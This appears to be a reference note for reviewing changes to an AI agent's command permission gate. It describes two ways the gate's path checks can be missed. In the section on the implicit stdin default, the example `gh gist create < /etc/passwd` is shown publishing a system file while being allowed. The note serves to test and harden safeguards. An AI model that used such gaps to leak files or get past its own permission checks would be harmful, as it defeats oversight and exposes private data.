---
name: new-path-grading-track-probe-classes
description: When a permission-gate PR adds path grading to a classifier, two probe classes its own tests structurally cannot reach — a verb's IMPLICIT stdin default (no operand, no `-`), and a static path combined with a shielded dynamic token — each found a real finding on #232.
metadata:
  type: reference
---

A PR that gives an existing classifier read containment on the files a
command opens writes tests around the operands and flags it modelled.
Two classes sit outside that frame by construction. Probe both before
grading such a PR, and baseline each probe against `origin/main`'s
committed binary so residual and regression are told apart.

**1. The verb's IMPLICIT stdin default.** A `-` operand is the
documented read-from-stdin marker and the obvious thing to model, but a
verb may *also* fall back to stdin when given no file operand at all,
so no token exists for the substitution to fire on. `gh gist create`
does exactly that — `cli/cli` `pkg/cmd/gist/create/create.go` at
`ref=v2.97.0`:

```go
if len(filenames) == 0 {
    filenames = []string{"-"}
}
```

with an `Args` validator that accepts zero args whenever stdin is not a
TTY. So `gh gist create < /etc/passwd` publishes the file under an
ALLOW while `gh gist create - < /etc/passwd` denies. Read the upstream
verb's own `RunE`/`Args` (`gh api "repos/cli/cli/contents/<path>?ref=v<VER>"`
→ `base64 -d`), don't take the `--help` USAGE line as the whole grammar
— the help said only "pass `-` as filename to read from standard input".

**2. A static path plus a SHIELDED dynamic token.** A new
"dynamic path cannot be contained → ask" guard keyed on the
whole-command `sc.hasUnknownExpansion` fires whenever *any* token
anywhere is dynamic, including tokens the gate deliberately shields.
For `gh`, `ghShieldingFlags` (`classify_command.go`) exists precisely so
`--title`/`--body`/`-t`/`-q` values may be dynamic, so
`gh pr create --title "$T" --body-file .claude/tmp/body.md` regressed
allow → ask on #232 while the PR's own row
(`gh pr comment 227 --body "$MSG"`, no path flag) still passed. The
codebase already knows the whole-command bool is too coarse —
`unshieldedDynamicArg` is the per-token narrowing precedent, and its
comment says so. **Probe the cross product**: static contained path ×
each shielded dynamic flag; the tests only ever cover one factor at a
time.

**How to apply:** on any guardrails PR that adds containment to a
classifier that lacked it. See [[guardrails-binary-verification]] for
the binary-level replay harness and the escape-path trap, and
[[checkout-pr-branch-before-exercising]] before running any of it.
